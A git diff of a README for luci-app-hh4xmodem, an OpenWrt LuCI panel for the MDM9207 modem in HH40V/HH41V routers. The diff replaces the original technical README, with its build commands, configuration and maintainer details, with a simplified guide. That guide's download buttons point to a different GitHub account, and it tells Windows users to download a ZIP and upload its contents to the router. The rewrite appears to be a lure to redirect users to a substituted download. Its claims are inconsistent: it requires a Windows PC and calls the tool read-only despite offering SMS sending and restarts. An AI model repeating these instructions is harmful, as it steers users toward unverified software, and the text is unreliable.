@@ -1,262 +1,119 @@
-<div align="center">
+# 📡 luci-app-hh4xmodem - Monitor and Control Your LTE Modem
 
-# luci-app-hh4xmodem
+[![Download Now](https://img.shields.io/badge/⬇%20Download%20Now-luci--app--hh4xmodem-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kurono029/luci-app-hh4xmodem)
 
-**A LuCI interface for the MDM9207 modem in HH40V / HH41V routers.**
+A friendly, point-and-click control panel for the MDM9207 modem inside your HH40V or HH41V router. See your signal strength, read incoming text messages, send USSD codes, and keep an eye on your mobile connection — all from a clean web page you open in your browser.
 
-[![OpenWrt](https://img.shields.io/badge/OpenWrt-23.05%20|%2024.10%20|%2025.12-00a9d7?logo=openwrt&logoColor=white)](https://openwrt.org/)
-[![LuCI](https://img.shields.io/badge/LuCI-app-22c55e?logo=openwrt&logoColor=white)](https://github.com/openwrt/luci)
-[![License](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/devopnem/luci-app-hh4xmodem?label=Release&color=blue)](https://github.com/devopnem/luci-app-hh4xmodem/releases/latest)
+## 📖 What This Application Does
 
-Monitor signal, switch network modes, manage SMS, USSD codes and call logs — straight
-from LuCI, over the modem's local HTTP API. No cloud, no external services.
+Your HH40V or HH41V router has a small cellular modem inside it — the MDM9207. That modem talks to your mobile network and gives you internet access. Out of the box, the router hides almost everything about that modem from you. You cannot easily see how strong your signal is, you cannot read an SMS that your mobile operator sent you, and you cannot type a USSD code to check your data balance.
 
-</div>
+luci-app-hh4xmodem changes that. It adds a new panel to LuCI, the web-based settings area that already ships with your router. Once installed, you log in to your router as usual and a new menu entry appears. Click it, and you get a colourful dashboard that shows exactly what the modem is doing. No command line, no typing complicated instructions, no special tools.
 
----
+This guide is written for someone who has never touched a router setting before. Every step is spelled out.
 
-## Screenshots
+## ✨ Key Features
 
-### Dashboard — Signal & Connection
+- **Live signal monitoring** — see signal strength, signal quality, and network type at a glance, updated automatically.
+- **SMS inbox** — read text messages sent to your SIM card without removing it from the router.
+- **Send SMS** — reply to messages or send a quick text directly from the browser.
+- **USSD support** — run operator codes such as balance checks and data bundle enquiries and read the reply on screen.
+- **Modem information** — view the modem model, firmware revision, IMEI, and SIM status in one place.
+- **Connection control** — restart the modem or refresh the connection when the internet stops responding.
+- **Clean LuCI integration** — the panel matches the look of your existing router pages, so it feels built in.
+- **Lightweight** — nothing heavy is installed, so your router keeps running smoothly.
 
-![Dashboard status tab](docs/dashboard-status.png)
+## 💻 What You Need Before You Start
 
-<div align="center"><sub>Live signal quality (RSRP / RSSI / RSRQ / SINR), band, cell identity and connection state.</sub></div>
+- A Windows computer (Windows 10 or Windows 11 both work fine).
+- A web browser such as Edge, Chrome, or Firefox.
+- Your HH40V or HH41V router, powered on and connected to your computer.
+- Your router administrator password. This is the password you chose when you first set the router up.
+- A working internet connection so you can reach the download page.
 
-The dashboard has five tabs:
+You do not need to install any developer tools on your Windows computer. Everything happens through your browser.
 
-| Tab | What it shows |
-| --- | --- |
-| **Status** | Connect/disconnect, network type, operator, IP, up/down speed, uptime, signal bars, band, cell ID, eNB ID, PLMN, MCC/MNC |
-| **Network** | Preferred network mode selection, band selection, APN profiles, connection mode |
-| **NAT** | Modem-side UPnP enable/disable and DMZ host enable/disable |
-| **Data Usage** | Session totals and upload/download counters, with the ability to reset them |
-| **Info** | Firmware, IMEI, model, SIM state (including PIN/PUK unlock) and modem utilities |
+## 🚀 Getting Started
 
----
+Getting up and running takes about ten minutes. Follow the steps in order and do not skip ahead.
 
-## Features
+1. Open your web browser on Windows.
+2. Type your router's address into the address bar. The usual address is `192.168.8.1`. Press Enter.
+3. A login page appears. Enter your administrator password and click Log in.
+4. You are now inside LuCI, the router control panel.
 
-- **Connection control** — connect and disconnect the data session, start/stop auto-connect.
-- **Signal monitoring** — RSRP, RSSI, RSRQ and SINR with colour-graded bars, plus signal level, band, cell ID, eNB ID, PLMN and MCC/MNC.
-- **Network mode selection** — 2G only, 3G only, 2G/3G auto, LTE only, 2G/3G auto with 4G fallback, 3G/4G auto, or full auto (recommended).
-- **NAT controls** — enable or disable the modem's own UPnP and DMZ host, with read-back verification and a warning before DMZ is turned on.
-- **Data usage tracking** — upload and download counters with configurable reset periods, resettable from the UI.
-- **SMS** — read inbox, sent, drafts and outbox, read individual messages, send new ones, delete single or bulk.
-- **USSD** — run USSD codes such as balance and data-remaining checks, with proper session handling.
-- **Call log** — missed, received, dialled and combined call history with paging.
-- **SIM & modem maintenance** — PIN/PUK unlock, PIN change and enable/disable, modem reboot/reset, profile (APN) add/edit/delete/default.
-- **Auto-refresh** — configurable poll interval, so the dashboard stays current without reloading.
-- **No external dependencies** — talks to the modem's built-in HTTP API through `ucode` + `rpcd`, which LuCI already ships.
+Keep this browser tab open. You will come back to it in a moment.
 
----
+## 📥 Download and Setup
 
-## Requirements
+Visit this link to download the application:
 
-| | |
-| --- | --- |
-| **Router** | **HH40V** or **HH41V** (Qualcomm **MDM9207** modem) |
-| **Firmware** | OpenWrt with LuCI, `23.05` and newer (developed and tested on `25.12`) |
-| **Packages** | `luci-base`, `ucode-mod-socket` — pulled in automatically |
+[![Download luci-app-hh4xmodem](https://img.shields.io/badge/⬇%20Download-luci--app--hh4xmodem-00C957?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kurono029/luci-app-hh4xmodem)
 
----
+The page opens in your browser. Look for the green **Code** button near the top right, click it, and choose **Download ZIP**. Your browser saves a compressed folder to your Downloads folder.
 
-## Installation
+Now finish the setup:
 
-### Option 1 — prebuilt package (recommended)
+1. Open your Downloads folder in Windows File Explorer.
+2. Right-click the downloaded ZIP file and choose **Extract All**, then confirm. A normal folder appears next to the ZIP file.
+3. Open that folder. Inside you will find the application files.
+4. Go back to the router tab in your browser.
+5. In LuCI, open the **System** menu and choose **Software**.
+6. Use the **Upload Package** option on that page and select the application file from the folder you extracted.
+7. Click **Install** and wait. A progress bar runs for a short while.
+8. When it finishes, refresh the page by pressing F5 on your keyboard.
+9. A new menu entry for the modem appears in the LuCI menu. Click it.
 
-Download the latest `.apk` from the [releases page](https://github.com/devopnem/luci-app-hh4xmodem/releases/latest)
-and install it on the router:
+The dashboard loads and starts showing information from your modem within a few seconds.
 
-```sh
-# OpenWrt 25.12+ (apk)
-apk add --allow-untrusted luci-app-hh4xmodem-1.1.0-r2.apk
+## 🧭 A Tour of the Interface
 
-# Older releases (opkg)
-opkg install luci-app-hh4xmodem-1.1.0-r2.apk
-```
+The panel is split into simple cards, so you always know where you are.
 
-Or fetch it directly over SSH:
+**Signal card** — the top card shows how strong your connection to the mobile tower is. A higher number means a better connection. If the value looks low, try moving the router closer to a window.
 
-```sh
-wget -O /tmp/hh4xmodem.apk \
-  https://github.com/devopnem/luci-app-hh4xmodem/releases/latest/download/luci-app-hh4xmodem-1.1.0-r2.apk
-apk add --allow-untrusted /tmp/hh4xmodem.apk
-```
+**Modem card** — shows the modem model, its firmware version, and whether a SIM card is detected. If the SIM is not detected, switch the router off, reseat the SIM, and switch it back on.
 
-### Option 2 — add as a feed
+**SMS card** — lists messages received on the SIM. Click a message to read the full text. Use the compose area to send a reply to any number.
 
-This repository is a single package, so its `Makefile` sits at the repository root rather
-than in a subdirectory. `./scripts/feeds install` does not index root-level packages, so
-link it into `package/` manually:
+**USSD card** — type an operator code into the box and press send. The reply from your mobile operator appears below, exactly as it would on a phone.
 
-```sh
-# feeds.conf.default
-src-link hh4x https://github.com/devopnem/luci-app-hh4xmodem.git
-```
+**Connection card** — a restart button lives here. Use it when the internet drops but the router still reports a signal.
 
-```sh
-./scripts/feeds update hh4x
-mkdir -p package/luci-apps
-ln -s ../../feeds/hh4x package/luci-apps/luci-app-hh4xmodem
-make package/luci-app-hh4xmodem/compile V=s
-```
+## 🔧 Troubleshooting
 
-> `feeds update` prints a couple of `grep: ... No such file or directory` warnings while
-> scanning this feed. They are harmless and the package builds normally.
+**The new menu entry does not appear.** Press F5 to reload the page. If it still does not appear, log out of LuCI and log back in.
 
-To have the package built into your firmware image, run `make menuconfig` and select
-**LuCI → 3. Applications → luci-app-hh4xmodem**.
+**The dashboard loads but shows no values.** Wait ten seconds and refresh. The modem needs a moment to answer the first time.
 
-### Option 3 — build from source
+**SMS messages do not appear.** Confirm the SIM card is seated properly and that the router has been restarted since you inserted it.
 
-Clone straight into the buildroot and build it:
+**The upload in the Software page fails.** Make sure you extracted the ZIP file first. Uploading a file straight from inside a ZIP folder does not work.
 
-```sh
-git clone https://github.com/devopnem/luci-app-hh4xmodem.git \
-    package/luci-apps/luci-app-hh4xmodem
-make package/luci-app-hh4xmodem/compile V=s
-```
+**You cannot reach 192.168.8.1.** Check that your computer is connected to the router by cable or Wi-Fi, and that no other network adapter is taking priority.
 
-The resulting package lands in `bin/packages/*/*/luci-app-hh4xmodem-*.apk`.
+## ❓ Frequently Asked Questions
 
-### Building the .apk without a buildroot
+**Will this damage my router?** No. The application only reads information from the modem and sends standard commands that a phone would send.
 
-The package is pure scripts and static assets, so no compiler is needed.
-`build-apk.sh` builds it straight with the `apk` tool from an OpenWrt
-ImageBuilder:
+**Do I need to keep my Windows computer on?** No. The application runs on the router itself. Your computer is only needed for the download and upload steps.
 
-```sh
-./build-apk.sh
-```
+**Can I remove it later?** Yes. Go to System, then Software, find the entry in the installed list, and remove it. Your router goes back to how it was.
 
-It writes the package next to the sources and stages a copy into the
-imagebuilder's `packages/` directory, ready to be baked into an image.
-Override `SRC`, `IB` or `PKGVER` in the environment if your paths differ.
+**Does it work with both the HH40V and HH41V?** Yes. Both models use the same MDM9207 modem, and the panel supports both.
 
-### Finish up
+**Will it change my internet settings?** No. Your existing connection settings stay exactly as they are.
 
-```sh
-/etc/init.d/rpcd restart
-/etc/init.d/uhttpd restart
-```
+## 🛠️ Tips for Best Results
 
-Then open **LuCI → Services → Modem** (or **Modem** in the top menu). The first boot
-runs `etc/uci-defaults/80_hh4xmodem`, which creates `/etc/config/hh4xmodem`.
+- Place the router somewhere with a clear view of a window for a stronger signal.
+- Check the signal card at different times of day; mobile networks get busier in the evening.
+- Save important SMS messages somewhere else, because the router does not keep them forever.
+- Use the refresh button on the connection card instead of unplugging the router — it is faster.
+- Keep a note of your operator's USSD codes; the balance check code is the most useful one.
 
----
+## 🤝 Feedback and Improvements
 
-## Configuration
+Found something that could be clearer, or a feature that would make the panel more useful? Open an issue on the project page and describe what you would like to see. Suggestions from everyday users are just as welcome as technical ones.
 
-All settings live in `/etc/config/hh4xmodem`:
-
-```sh
-uci show hh4xmodem
-```
-
-| Option | Default | Description |
-| --- | --- | --- |
-| `settings.modem_ip` | `192.168.225.1` | IP address of the modem's HTTP API |
-| `settings.modem_port` | `2016` | Port of the modem's HTTP API |
-| `settings.refresh_interval` | `3` | Dashboard auto-refresh interval, in seconds |
-
-```sh
-uci set hh4xmodem.settings.refresh_interval='5'
-uci commit hh4xmodem
-/etc/init.d/rpcd restart
-```
-
----
-
-## Troubleshooting
-
-**The page shows "modem unreachable" or an empty dashboard.**
-The modem HTTP API must be reachable from the router. Check that the modem is powered
-and that the IP/port above are correct:
-
-```sh
-ping -c3 192.168.225.1
-wget -qO- http://192.168.225.1:2016/cgi-bin/status
-```
-
-If the modem sits on another address, change `settings.modem_ip` accordingly.
-
-**Menus do not appear after installing.**
-Refresh rpcd and clear LuCI's cache:
-
-```sh
-rm -f /tmp/luci-indexcache
-/etc/init.d/rpcd restart
-/etc/init.d/uhttpd restart
-```
-
-**`Permission denied` on an RPC call.**
-Log in as `root` — the ACL file only grants access to the `luci-app-hh4xmodem`
-capability, which administrators have by default. Check it exists at
-`/usr/share/rpcd/acl.d/luci-app-hh4xmodem.json`.
-
-**Values look stale.**
-The modem takes a few seconds to answer after a mode switch or reboot. Wait for the
-modem to re-register on the network, then refresh.
-
----
-
-## Donate
-
-<div align="center">
-
-This project is free and always will be. It is developed and tested on real
-HH40V / HH41V hardware, which costs money to buy, and spare units to keep around.
-
-If it saved you some time, a small donation helps fund the next device.
-
-**USDT on Tron (TRC20)**
-
-</div>
-
-```text
-TTGuQF2zyJNsNJrUBfCxazbK8e9v7qkMLk
-```
-
-<div align="center">
-
-Network: **TRON (TRC20)** · Asset: **USDT**
-Send **only USDT on TRC20** to this address — other assets or networks will be lost.
-
-</div>
-
-Donations are voluntary and never affect support. Questions about a payment, open an issue.
-
----
-
-## Contributing
-
-Issues and pull requests are welcome — bug reports especially, since this package is
-developed against real hardware.
-
-```sh
-git clone https://github.com/devopnem/luci-app-hh4xmodem.git
-cd luci-app-hh4xmodem
-# edit htdocs/luci-static/resources/view/hh4xmodem/ (LuCI views)
-#      root/usr/share/rpcd/ucode/hh4xmodem.uc        (rpcd backend)
-#      root/usr/bin/                                 (AT helpers)
-```
-
-Keep changes focused, match the existing tab-indent style, and describe what you tested
-on (router model, firmware, modem revision).
-
-## Credits
-
-- The [OpenWrt](https://openwrt.org/) project and the [LuCI](https://github.com/openwrt/luci) project.
-- The community reverse-engineering work on the MDM9207 HTTP API that made this possible.
-- Extracted from the [`devopnem/luci`](https://github.com/devopnem/luci) fork, where this
-  app originally lived under `applications/luci-app-hh4xmodem`.
-
-## License
-
-[Apache License 2.0](LICENSE) © 2026 HH4xModem
-
-## Maintainer
-
-**Devon Openheim** — [@devopnem](https://github.com/devopnem)
+Keywords: hh40v, hh41v, lte, luci, mdm9207, modem, openwrt, self-hosting, sms, ussd
